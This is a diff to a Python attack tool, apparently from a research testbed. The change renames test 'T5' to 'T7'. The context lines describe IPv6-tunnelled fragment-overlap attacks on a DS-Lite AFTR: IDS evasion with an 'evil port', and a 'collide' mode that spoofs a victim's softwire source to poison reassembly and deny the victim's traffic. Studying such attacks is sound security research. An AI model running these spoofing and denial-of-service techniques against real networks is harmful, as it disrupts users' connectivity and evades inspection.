@@ -1,16 +1,16 @@
 #!/usr/bin/python
-# T5 – Softwire Reassembly Poisoning  (Gilad & Herzberg, "Fragmentation
+# T7 – Softwire Reassembly Poisoning  (Gilad & Herzberg, "Fragmentation
 #      Considered Vulnerable", ACM TISSEC 2013)
 #
 # Targets the inner-IPv4 fragment reassembly the AFTR must perform before NAT.
 # The inner IPv4 packets are carried inside IPv6 (4-in-6) softwire.
 #
-# T5 (overlap): the CLASSIC overlapping-fragment probe — two fragments of one
+# T7 (overlap): the CLASSIC overlapping-fragment probe — two fragments of one
 #   datagram at offset 0 (benign vs evil port). Different reassembly policies
 #   reassemble differently at the host vs inspection devices (IDS evasion).
 #   On a modern (RFC 5722) AFTR this is contained; kept as a policy probe.
 #
-# T5 (collide — the real T5, "reassembly poisoning"): NOT a single-datagram
+# T7 (collide — the real T7, "reassembly poisoning"): NOT a single-datagram
 #   overlap. The attacker exploits the PREDICTABLE IP-ID to inject offset-0
 #   inner-IPv4 fragments that carry the VICTIM's reassembly four-tuple
 #   (src,dst,proto,IP-ID), spoofing the victim's softwire source (::b41). When
@@ -72,7 +72,7 @@ def ndp_resolve(iface, target_ip6):
     return "ff:ff:ff:ff:ff:ff"
 
 
-# ── T5: FRAGMENT OVERLAP ATTACK ──────────────────────────────────────────
+# ── T7: FRAGMENT OVERLAP ATTACK ──────────────────────────────────────────
 
 def build_overlap_fragments(src_ip6, aftr_ip6, inner_src4, target_ip4,
                              frag_id, benign_port, evil_port, dmac):
@@ -121,19 +121,19 @@ def build_overlap_fragments(src_ip6, aftr_ip6, inner_src4, target_ip4,
 
 
 def run_overlap(args, dmac):
-    """T5: Overlapping fragment attack — probes AFTR reassembly policy.
+    """T7: Overlapping fragment attack — probes AFTR reassembly policy.
 
     Sends pairs of IPv6 fragments with the same ID and offset=0 but different
     inner TCP destination ports (benign vs evil). Checks conntrack after each
     batch to determine which port the kernel keeps (first-wins/last-wins/drop).
-    RFC 5722-compliant Linux kernels (≥3.9) use first-wins or drop, so T5 is
+    RFC 5722-compliant Linux kernels (≥3.9) use first-wins or drop, so T7 is
     expected to be contained on modern testbed kernels.
     """
     import subprocess as _sp, re as _re
     benign_port = args.target_port
     evil_port   = args.evil_port
 
-    print("[*] T5 – Fragment Overlap Attack (reassembly policy probe)")
+    print("[*] T7 – Fragment Overlap Attack (reassembly policy probe)")
     print(f"[*] Benign port (frag0, IDS inspects): {benign_port}")
     print(f"[*] Evil port   (frag1, overlapping) : {evil_port}")
     print(f"[*] Sending {args.count} overlap pairs")
@@ -323,7 +323,7 @@ def build_inner_overlap_fragment(b4_src_ip6, aftr_ip6, inner_src4, inner_dst4,
 
 
 def run_collide(args, dmac):
-    """T5 (strengthened): inner-IPv4 reassembly OVERLAP injection.
+    """T7 (strengthened): inner-IPv4 reassembly OVERLAP injection.
 
     Where the plain `overlap` mode only probes the AFTR reassembly policy and
     is contained by RFC 5722, this mode weaponises that very policy. It denies
@@ -337,7 +337,7 @@ def run_collide(args, dmac):
     b4_src    = args.b4_src_ip6
     proto     = args.proto
 
-    print("[*] T5 (collide) – Inner-IPv4 reassembly overlap injection")
+    print("[*] T7 (collide) – Inner-IPv4 reassembly overlap injection")
     print(f"[*] Victim inner flow : {inner_src} -> {inner_dst}  proto={proto}")
     print(f"[*] Spoofed softwire  : {b4_src} -> {args.aftr_ip6}  (4-in-6 decap)")
     print(f"[*] Forward IP-ID band: {args.band}   duration: {args.duration}s")
@@ -494,15 +494,15 @@ def main():
                         help='AFTR MAC address (auto-resolved via NDP if omitted)')
 
     p = argparse.ArgumentParser(
-        description="T5 – Fragment Overlap / inner-IPv4 reassembly collision\n"
+        description="T7 – Fragment Overlap / inner-IPv4 reassembly collision\n"
                     "All attacks operate on IPv6-encapsulated (4-in-6) softwire traffic.",
         formatter_class=argparse.RawDescriptionHelpFormatter
     )
     sub = p.add_subparsers(dest='mode', required=True)
 
-    # T5 overlap
+    # T7 overlap
     s10 = sub.add_parser('overlap', parents=[common],
-                         help='T5: Overlapping fragments with ambiguous reassembly')
+                         help='T7: Overlapping fragments with ambiguous reassembly')
     s10.add_argument('--target-port', type=int, default=80,
                      help='Benign port shown to IDS (default: 80)')
     s10.add_argument('--evil-port', type=int, default=4444,
@@ -512,9 +512,9 @@ def main():
     s10.add_argument('--interval', type=float, default=0.05,
                      help='Seconds between pairs (default: 0.05)')
 
-    # T5 collide (strengthened) — inner-IPv4 reassembly overlap injection
+    # T7 collide (strengthened) — inner-IPv4 reassembly overlap injection
     s11 = sub.add_parser('collide', parents=[common],
-                         help='T5 (strong): deny a victim flow via inner-IPv4 '
+                         help='T7 (strong): deny a victim flow via inner-IPv4 '
                               'overlap injection (pre-seed-ahead)')
     s11.add_argument('--b4-src-ip6', default='2001:db8:cafe::b41',
                      help="Spoofed softwire source = victim's B4 (default ::b41)")
